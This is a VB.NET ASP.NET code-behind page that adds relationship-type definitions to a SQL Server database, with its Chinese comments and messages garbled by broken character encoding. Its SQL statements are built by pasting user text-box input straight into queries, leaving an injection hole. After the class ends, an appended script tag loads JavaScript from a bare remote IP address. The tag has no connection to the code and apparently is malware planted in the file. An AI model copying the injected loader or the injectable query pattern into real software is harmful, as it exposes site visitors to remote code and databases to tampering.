Imports System.Data
Imports System.Data.SqlClient

Public Class WebForm3
    Inherits System.Web.UI.Page

#Region " Web ������������ɵĴ��� "

    '�õ����� Web ���������������ġ�
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents btnNext As System.Web.UI.WebControls.Button
    Protected WithEvents rbtnIsValidNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsValidYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnAccPri3 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri2 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnAccPri1 As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblIsValid As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnNeedAffNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnNeedAffYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents lblNeedAff As System.Web.UI.WebControls.Label
    Protected WithEvents rbtnIsDirNo As System.Web.UI.WebControls.RadioButton
    Protected WithEvents rbtnIsDirYes As System.Web.UI.WebControls.RadioButton
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents txtRelObjNum As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblRelObjNum As System.Web.UI.WebControls.Label
    Protected WithEvents txtDefName As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblDefName As System.Web.UI.WebControls.Label
    Protected WithEvents txtDefKey As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblDefKey As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstModelKey As System.Web.UI.WebControls.DropDownList
    Protected WithEvents lblModelKey As System.Web.UI.WebControls.Label
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents Form1 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents txtDefKeyRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents txtRelObjNumRegularexpressionvalidator1 As System.Web.UI.WebControls.RegularExpressionValidator


    'ע��: ����ռλ�������� Web ���������������ġ�
    '��Ҫɾ�����ƶ�����
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: �˷��������� Web ����������������
        '��Ҫʹ�ô���༭���޸�����
        InitializeComponent()
    End Sub

#End Region
    
    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.lblWarning.Visible = False

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "����û��¼�����ȵ�¼"
        Else
            Me.lblHint.Text = "���ã� " + Session("UserName")
        End If

        If Not IsPostBack Then  ' �û�x��һ�δ�ҳ��ʱ
            Me.rbtnIsValidYes.Checked = True
            Me.rbtnNeedAffYes.Checked = True
            Me.rbtnAccPri1.Checked = True
            Me.rbtnIsDirYes.Checked = True
            Dim strSql As String
            Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
            Try
                mySqlConn.Open()

                Dim mySqlAdapter As New SqlDataAdapter("select rmodelkey from rmodel", mySqlConn)
                Dim myDateSet As New DataSet
                mySqlAdapter.Fill(myDateSet, "rmodel")
                Me.ddlstModelKey.DataSource = myDateSet.Tables("rmodel").DefaultView
                Me.ddlstModelKey.DataValueField = "rmodelkey"
                Me.ddlstModelKey.DataBind()
                mySqlConn.Close()
            Catch ex As SqlException
                Response.Redirect("error.htm") ' ������ʾ
            Finally
            End Try
        End If
    End Sub

    Private Sub btnNext_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNext.Click
        If (Me.txtDefKey.Text.Trim() = "" Or Me.txtDefName.Text.Trim() = "" Or Me.txtRelObjNum.Text.Trim() = "") Then
            Me.lblWarning.Text = "���ѣ��������ȫ����Ϣ"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False

        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select * from rdefinition where rDefinitionKey='" + Me.txtDefKey.Text.Trim() + "'"
        ' �鿴rRefinitionKey�Ƿ��ѷ���
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "���棺�ù�ϵ���ͱ���Ѵ��ڣ��������µĹ�ϵ���ͱ��"
                lblWarning.Visible = True
            Else
                ' ��ȡ�û�Ȩ��ֵ����Ч��ֵ,�Ƿ���Ҫ���������ȷ����Ϣ,�Ƿ�����
                ' ������chrAccPri, chrIsValid��chrNeedAff��chrIsDir��
                Dim chrAccPri As Char
                Dim chrIsValid As Char
                Dim chrNeedAff As Char
                Dim chrIsDir As Char
                If Me.rbtnAccPri1.Checked = True Then
                    chrAccPri = "1"
                ElseIf Me.rbtnAccPri2.Checked = True Then
                    chrAccPri = "2"
                Else
                    chrAccPri = "3"
                End If
                If Me.rbtnIsValidYes.Checked = True Then
                    chrIsValid = "1"
                Else
                    chrIsValid = "0"
                End If
                If Me.rbtnNeedAffYes.Checked = True Then
                    chrNeedAff = "1"
                Else
                    chrNeedAff = "0"
                End If
                If Me.rbtnIsDirYes.Checked = True Then
                    chrIsDir = "1"
                Else
                    chrIsDir = "0"
                End If

                ' ����������
                strSql = "Insert into rdefinition values('" + Me.txtDefKey.Text.Trim() + "'," + _
                    Me.ddlstModelKey.SelectedValue.Trim() + ",'" + Me.txtDefName.Text.Trim() + "','" + _
                    Me.txtRelObjNum.Text.Trim() + "','" + _
                    chrIsDir + "','" + chrAccPri + "','" + chrNeedAff + "','" + _
                    Now.ToString("yyyy-MM-dd HH:mm:ss") + "','" + Now.ToString("yyyy-MM-dd HH:mm:ss") + "','" + _
                    chrIsValid + "')"
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "��ϲ����ӹ�ϵ���ͳɹ�" + Me.txtDefKey.Text.Trim() + "�ɹ�"
                    Me.lblWarning.Visible = True
                    Me.Session("DefKey") = Me.txtDefKey.Text.Trim()
                    Me.Session("DefNum") = Int32.Parse(Me.txtRelObjNum.Text.Trim())
                    Me.Response.Redirect("addpublishrassertion.aspx")
                Else
                    Me.lblWarning.Text = "���棺����ĳ��ԭ����ӹ�ϵ����ʧ�ܣ�������û��Ȩ��"
                    Me.lblWarning.Visible = True
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Throw ex
            'Response.Redirect("error.htm") ' ������ʾ
        Finally
        End Try
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Me.lblWarning.Visible = False
        Me.txtDefKey.Text = ""
        Me.txtDefName.Text = ""
        Me.txtRelObjNum.Text = ""
        Me.rbtnAccPri2.Checked = False
        Me.rbtnAccPri3.Checked = False
        Me.rbtnAccPri1.Checked = True
        Me.rbtnIsValidNo.Checked = False
        Me.rbtnIsValidYes.Checked = True
        Me.rbtnNeedAffNo.Checked = False
        Me.rbtnNeedAffYes.Checked = True
        Me.rbtnIsDirNo.Checked = False
        Me.rbtnIsDirYes.Checked = True
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
